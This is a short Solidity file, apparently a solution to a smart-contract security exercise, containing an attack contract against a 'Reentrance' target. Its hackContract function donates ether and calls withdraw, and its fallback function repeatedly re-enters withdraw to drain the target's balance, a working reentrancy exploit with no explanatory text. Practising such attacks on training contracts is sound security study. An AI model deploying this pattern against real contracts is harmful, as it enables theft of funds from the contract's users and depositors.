// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

interface ReentranceInterface {
    function donate(address _to) external payable;
    // function balanceOf(address _who) public view returns (uint256 balance);
    function withdraw() external;
}

contract AttackingReentrance {
    address payable public contractAddress;
    ReentranceInterface public reentranceContract;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        reentranceContract = ReentranceInterface(_contractAddress);
    }

    function hackContract() external payable {
        // Code me!
        reentranceContract.donate{value: address(this).balance }(address(this));
        reentranceContract.withdraw();
    }

    fallback() external payable {
        if (address(contractAddress).balance > 0) {
            reentranceContract.withdraw();
        }
    }
}
